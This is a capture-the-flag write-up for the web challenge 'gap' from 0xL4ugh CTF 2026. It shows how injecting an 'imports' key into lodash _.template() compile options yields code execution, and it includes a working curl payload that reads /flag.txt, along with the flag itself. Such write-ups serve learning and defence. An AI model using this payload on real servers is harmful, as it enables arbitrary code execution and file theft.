---
title: "[Web] gap"
description: Writeup for "gap" from 0xL4ugh CTF 2026.
date: 2026-01-26 01:00:00 +0900
categories: [CTF, 0xL4ugh CTF 2026]
tags: [Web]
toc: true
comments: false
render_with_liquid: false
---

## TL;DR

The `/render` endpoint passes the entire `req.body` into lodash's `_.template()`, including the **compile options**.
By injecting into the `imports` option, we can override how `input` is defined — making it read `/flag.txt` instead of using our input value.

✅ Flag: `0xL4ugh{L0d4sh_G0t_N0_Ch1ll_f976a9976eb47af4}`

---

## Overview

A simple Node.js + Express rendering service.

- **Endpoint:** `POST /render`
- **Template:** Fixed as `<%= input %>`
- **Flag:** Stored at `/flag.txt` on the server

At first glance it looks safe — the template only prints `input`, so normal SSTI won't work.
The real bug is that `req.body` leaks into lodash's **compile options**, not just the template data.

---

## Root Cause

lodash `_.template()` works like this:

```js
const compiled = _.template(templateString, options);
compiled(data); // render
```

The server should only pass `req.body` as `data`, but instead it also leaks into `options`.
This means we can control `options.imports` — which affects the **function scope** that lodash generates during compilation.

By setting a key like `"input=<some code>"` inside `imports`, we can override the default value of `input` in the compiled function, making it run arbitrary JavaScript when the template is rendered.

---

## Exploit

### Normal request (confirm behavior)

```bash
curl -s -X POST "http://challenges4.ctf.sd:34454/render" \
  -H "Content-Type: application/json" \
  -d '{"input":"hello"}'
# Output: hello
```

### Inject `imports` to read `/flag.txt`

```bash
curl -s -X POST "http://challenges4.ctf.sd:34454/render" \
  -H "Content-Type: application/json" \
  --data-binary '{"imports":{"a,b,input=global.process.mainModule.require(\"fs\").readFileSync(\"/flag.txt\",\"utf8\")":1}}'
# Output: 0xL4ugh{...}
```

**Why this works:**

The key string `a,b,input=<code>` gets placed into the compiled function's parameter list.
When lodash builds the function internally, it becomes something like:

```js
function(a, b, input = fs.readFileSync("/flag.txt", "utf8")) { ... }
```

Since we don't pass `input` ourselves, JavaScript uses the **default value** — which reads the flag file.
The template then prints `<%= input %>` and outputs the flag.

---

## Flag

```
0xL4ugh{L0d4sh_G0t_N0_Ch1ll_f976a9976eb47af4}
```

---
